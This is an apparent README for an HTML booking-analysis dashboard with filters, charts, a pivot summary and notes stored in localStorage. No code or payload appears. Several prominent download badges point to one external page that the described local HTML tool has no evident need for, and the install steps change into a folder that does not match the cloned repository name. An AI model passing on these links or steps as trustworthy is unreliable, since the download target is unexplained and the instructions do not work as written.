# Daily Booking Dashboard v2026 - data analysis dashboard 2026

> **Daily Booking Dashboard is an HTML-based CULines daily booking analysis dashboard that brings filters, KPI cards, charts, pivot summaries, and saved notes together in one local workspace for version 2026.**

[![Platform](https://img.shields.io/badge/Platform-HTML-blue?style=flat-square)](https://github.com)
[![Version](https://img.shields.io/badge/Version-v2026-green?style=flat-square)](https://github.com)
[![Updated](https://img.shields.io/badge/Updated-2026-red?style=flat-square)](https://github.com)
[![License](https://img.shields.io/badge/License-GPL--3.0-yellow?style=flat-square)](LICENSE)
[![Stars](https://img.shields.io/github/stars/leo-keller30/daily-booking-dashboard-win-63950?style=flat-square)](https://github.com/leo-keller30/daily-booking-dashboard-win-63950)

---

<p align="center">
  <a href="https://leo-keller30.github.io/daily-booking-dashboard-win-63950/">
    <img src="https://img.shields.io/badge/Download-Daily%20Booking%20Dashboard%20Latest-brightgreen?style=for-the-badge" alt="Download Daily Booking Dashboard">
  </a>
</p>

> **[Direct Download - Daily Booking Dashboard v2026](https://leo-keller30.github.io/daily-booking-dashboard-win-63950/)**

---

[Download Latest Build](https://leo-keller30.github.io/daily-booking-dashboard-win-63950/)

---

## About Daily Booking Dashboard

Daily Booking Dashboard is a browser-based dashboard for working with CULines daily booking data. It is designed to help you review, filter, and compare booking activity without switching between separate spreadsheets and reporting views.

The interface focuses on fast analysis of daily booking records with charts, KPI cards, a pivot-style summary, and a detailed table view. It also keeps custom notes in localStorage, making it useful for recurring review sessions where you want your annotations to stay available in the same browser.

---

## Features

- Multi-lane filtering for narrowing results by route or lane group
- CUL code search filter for quick lookup of booking records
- POL/DEL search filter for origin and destination-based analysis
- KPI cards for high-level operational snapshots
- Summary pivot table for grouped booking review
- Chart.js visualizations for trend and distribution insight
- Detail table for record-level inspection and comparison
- Custom notes persistence through localStorage for saved observations

---

## Installation

1. Download or clone the repository:
   ```bash
   git clone https://github.com/leo-keller30/daily-booking-dashboard-win-63950.git
   ```

2. Open the project folder:
   ```bash
   cd daily-booking-dashboard
   ```

3. Launch the HTML file in a modern browser, or serve it locally with any static web server.

If you are using a local server, open the main dashboard page after the server starts.

---

## Usage

1. Load your daily booking data in the dashboard workflow.
2. Apply the lane, CUL code, or POL/DEL filters to focus on the records you need.
3. Review the KPI cards and charts to spot changes, peaks, or distribution patterns.
4. Use the pivot summary to compare grouped metrics.
5. Check the detail table for row-level verification.
6. Add notes when you need to keep context for later review.

Example workflow:

- Search by CUL code to isolate a specific shipment group
- Refine the view with POL/DEL terms
- Compare totals in the summary pivot table
- Inspect the chart output for trends
- Save notes directly in the browser for the next session

---

## Configuration

Dashboard settings and saved notes are stored in `localStorage` in the browser.

Typical configuration areas include:

- Filter selections
- Note content
- Last-used view state, if supported by the current browser session

If you need to reset saved data, clear the site storage for the dashboard in your browser settings.

---

## Requirements

- A modern web browser with HTML5 support
- JavaScript enabled
- Chart.js available in the dashboard runtime
- Enough browser storage for local notes and saved state
- Access to Excel-exported or spreadsheet-based booking data, if you are preparing input from that workflow

---

## FAQ

**How do I update the dashboard?**  
Replace your local copy with the latest build from the project download location, then reopen the HTML file in your browser.

**Why are my notes not showing up?**  
The dashboard uses localStorage, so notes stay in the same browser profile. If storage was cleared, the saved notes will not be available.

**Can I use it on another machine?**  
Yes, but browser-stored notes and preferences do not move automatically. Copy any needed data and re-enter or export your notes as needed.

**What should I do if charts or filters do not load correctly?**  
Check that you are opening the correct HTML entry point, that JavaScript is enabled, and that the browser supports the required features.

**Where are configuration changes stored?**  
They are saved in the browser through localStorage unless you add your own external storage workflow.

---

## License

GNU GPL v3.0 - see [LICENSE](LICENSE) for details.
